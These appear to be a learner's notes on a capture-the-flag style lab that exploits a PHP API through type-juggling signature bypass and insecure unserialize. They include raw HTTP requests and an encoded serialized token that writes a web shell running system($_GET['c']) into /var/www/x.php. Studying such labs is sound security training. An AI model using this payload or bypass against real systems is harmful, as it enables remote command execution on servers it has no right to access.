api to shell
 - `apishell_filephp.txt` contains code that we get after php type thingy
 - run `notes` in same directory to get malicious token


notes:
	we need to find an action (file/files/upload/etc.) that goes through detokenize (all do)
	that action should not run any method on $user since we have provided the file class instead
	for some reason register action didn't work but login action worked
	after opening x.php i saw: register: by login: by
	so apparently both worked but only after sometime (or after login action) was the file viewable


token: Tzo0OiJGaWxlIjozOntzOjU6Im93bmVyIjtOO3M6NDoidXVpZCI7czoyODoiPD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA%2FPiI7czo3OiJsb2dmaWxlIjtzOjE0OiIvdmFyL3d3dy94LnBocCI7fQ%3D%3D--3a050cc06a5ef9bfba68f9f7f681890d

token: 

$userdata: 
Tzo0OiJGaWxlIjozOntzOjU6Im93bmVyIjtOO3M6NDoidXVpZCI7czoyODoiPD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA%2FPiI7czo3OiJsb2dmaWxlIjtzOjE0OiIvdmFyL3d3dy94LnBocCI7fQ%3D%3D

sign($userdata)==$usersig;

$usersig:
3a050cc06a5ef9bfba68f9f7f681890d

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

this course details the exploitation of two vulnerabilities:

    a weakness in a signature check due to php type confusion.
    a call to php unserialize.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /register HTTP/1.1
Host: ptl-9f045d32-88d01f0a.libcurl.so
Content-Type: application/json
Content-Length: 41

{"username":"xyz1","password":"xyz1"}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /login HTTP/1.1
Host: ptl-9f045d32-88d01f0a.libcurl.so
Content-Type: application/json
Content-Length: 41

{"username":"xyz1","password":"xyz1"}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /upload HTTP/1.1
Host: ptl-9f045d32-88d01f0a.libcurl.so
Content-Type: application/json
Content-Length: 179

{"token":"Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjMiO3M6NToibG9naW4iO3M6NDoieHl6MSI7fQ%3D%3D--5b90e2d0937b25d64fb3ba0bd4d54cd1", "filename": "text.txt", "content": "MY DATA..."}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /files HTTP/1.1
Host: ptl-9f045d32-88d01f0a.libcurl.so
Content-Type: application/json
Content-Length: 130

{"token":"Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjMiO3M6NToibG9naW4iO3M6NDoieHl6MSI7fQ%3D%3D--5b90e2d0937b25d64fb3ba0bd4d54cd1"}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

POST /file HTTP/1.1
Host: ptl-9f045d32-88d01f0a.libcurl.so
Content-Type: application/json
Content-Length: 182

{"token":"Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtzOjE6IjMiO3M6NToibG9naW4iO3M6NDoieHl6MSI7fQ%3D%3D--5b90e2d0937b25d64fb3ba0bd4d54cd1","uuid":"././file5d7b29ae8c1de5d7b29ae8c21d","sig":0}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

PHP Comparisons

http://blog.astrumfutura.com/2015/05/phps-magic-hash-vulnerability-or-beware-of-type-juggling/
http://turbochaos.blogspot.com/2013/08/exploiting-exotic-bugs-php-type-juggling.html


one of the key thing with json is that the person calling the api can decide on the type of data:

{ "firstName": "John",
  "lastName": "Smith",
  "isAlive": true,
  "age": 25,
  "height_cm": 167.6,
  "children": [] }

here we can see that multiple types are used: array, hash, integer, float, string. since the application is using json, we can decide on the type of the signature sig. using the fact that we can force the type of the signature, we can decide what the type of the signature is, we can force a comparison between a string and an integer and hope that the application is using a loose comparison.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

__wakeup is used whenever an object is initialized
__destruct is used to clean off the memory, kind of like a garbage collector

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~